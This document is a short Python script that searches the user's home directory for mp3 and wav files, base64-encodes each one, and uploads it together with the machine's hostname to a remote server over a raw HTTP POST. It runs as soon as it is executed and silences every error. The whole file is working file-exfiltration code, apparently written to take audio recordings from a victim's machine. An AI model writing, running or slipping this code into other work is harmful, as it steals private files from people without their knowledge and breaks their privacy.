import base64
import socket
import os

host = "0.0.0.0"
port = 89

import base64
import re

def encode(file_data):
    try:
        encoded_data = base64.b64encode(file_data).decode('utf-8')
        safe_encoded_data = encoded_data.replace('+', '-').replace('/', '_')
        return(safe_encoded_data)
        print("File encoded and prepared for transmission successfully.")    
    except Exception as e:
        print(f"An error occurred: {e}")

def send(path):
    contents = open(path, 'rb').read()
    encd = encode(contents)                                                     
    fn = path.split("/")[-1]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    hn = socket.gethostname()
    headers = """\
POST /upload.php HTTP/1.1\r
Content-Type: {content_type}\r
Content-Length: {content_length}\r
Host: {host}\r
Connection: close\r
\r\n"""
    body = f'hn={hn}&fname={fn}&dat={encd}'                                 
    body_bytes = body.encode('ascii')
    header_bytes = headers.format(
        content_type="application/x-www-form-urlencoded",
        content_length=len(body_bytes),
        host=str(host) + ":" + str(port)
    ).encode('iso-8859-1')
    payload = header_bytes + body_bytes
    s.sendall(payload)

def main():
    tpath = os.path.expanduser('~')
    targets = []
    extension = ["mp3","wav"]
    for itr1 in extension:
        for r,d,f in os.walk(tpath):
            for i in f:
                path = os.path.join(r, i)
                if itr1 == path.split('.')[-1]:
                    try:
                        send(path)
                    except:
                        pass
                else:
                    pass

main()
